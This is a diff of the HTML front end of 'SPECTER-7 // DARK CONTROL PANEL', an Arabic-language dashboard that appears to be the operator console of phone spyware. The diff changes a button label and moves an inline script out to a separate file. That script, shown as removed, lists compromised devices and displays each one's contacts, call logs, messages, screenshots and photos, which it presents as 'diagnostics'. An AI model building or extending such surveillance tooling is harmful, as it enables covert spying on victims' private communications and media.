@@ -53,7 +53,7 @@ tr:hover { background: rgba(255,255,255,.01); }
 <header>
     <h1>SPECTER-7 // DARK CONTROL PANEL</h1>
     <div class="header-actions">
-        <button class="logout-btn" onclick="logout()">إعادة تحميل</button>
+        <button class="logout-btn" onclick="logout()">تحديث الصفحة</button>
     </div>
 </header>
 
@@ -120,98 +120,7 @@ tr:hover { background: rgba(255,255,255,.01); }
     </div>
 </main>
 
-<script>
-let currentDevice = null;
-
-function logout() {
-    location.reload();
-}
-
-async function loadDevices() {
-    try {
-        const res = await fetch("/api/devices");
-        const data = await res.json();
-        const select = document.getElementById("deviceSelect");
-        select.innerHTML = '<option value="">اختر الجهاز للتحكم...</option>';
-        if (data.devices) {
-            data.devices.forEach(d => {
-                const opt = document.createElement("option");
-                opt.value = d.id;
-                opt.textContent = `${d.model || d.id} (${d.status})`;
-                select.appendChild(opt);
-            });
-            if (data.devices.length > 0 && !currentDevice) {
-                select.value = data.devices[0].id;
-                selectDevice(data.devices[0].id);
-            }
-        }
-    } catch(e) { console.error(e); }
-}
-
-function selectDevice(id) {
-    currentDevice = id;
-    if (id) fetchDeviceData(id);
-}
-
-async function fetchDeviceData(id) {
-    try {
-        const res = await fetch(`/api/diagnostics/${id}`);
-        const data = await res.json();
-        const diag = data.diagnostics || {};
-
-        renderGallery("studioGallery", diag.media?.items || []);
-        renderGallery("screenshotsGallery", diag.screenshots?.items || []);
-
-        renderTable("contactsTable", diag.contacts?.items || []);
-        renderTable("callsTable", diag.calls?.items || []);
-        renderTable("messagesTable", diag.messages?.items || []);
-
-    } catch(e) { console.error(e); }
-}
-
-function renderGallery(elementId, items) {
-    const container = document.getElementById(elementId);
-    container.innerHTML = "";
-    if (!items || items.length === 0) {
-        container.innerHTML = '<p style="color: var(--muted); grid-column: 1/-1;">لا توجد صور متاحة حالياً.</p>';
-        return;
-    }
-    items.forEach(path => {
-        const div = document.createElement("div");
-        div.className = "gallery-item";
-        div.innerHTML = `
-            <img src="${path}" alt="صورة جهاز" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'100\' height=\'100\'><rect width=\'100%\' height=\'100%\' fill=\'%23111\'/><text x=\'50%\' y=\'50%\' fill=\'%23555\' font-size=\'10\' text-anchor=\'middle\' dominant-baseline=\'middle\'>صورة</text></svg>'">
-            <a href="${path}" target="_blank" download>تحميل الصورة</a>
-        `;
-        container.appendChild(div);
-    });
-}
-
-function renderTable(tableId, items) {
-    const tbody = document.querySelector(`#${tableId} tbody`);
-    tbody.innerHTML = "";
-    if (!items || items.length === 0) {
-        tbody.innerHTML = '<tr><td colspan="2" style="color: var(--muted); text-align: center;">لا توجد بيانات متاحة.</td></tr>';
-        return;
-    }
-    items.forEach(item => {
-        const tr = document.createElement("tr");
-        const parts = item.split(":");
-        tr.innerHTML = `<td>${parts[0] || item}</td><td>${parts[1] || ''}</td>`;
-        tbody.appendChild(tr);
-    });
-}
-
-function switchTab(tabName) {
-    document.querySelectorAll(".menu-btn").forEach(b => b.classList.remove("active"));
-    document.querySelectorAll(".tab-pane").forEach(p => p.classList.remove("active"));
-    
-    event.currentTarget.classList.add("active");
-    document.getElementById(tabName + "Tab").classList.add("active");
-}
-
-loadDevices();
-setInterval(loadDevices, 15000);
-</script>
+<!-- ربط ملف الجافاسكريبت الصحيح -->
+<script src="script.js"></script>
 </body>
 </html>
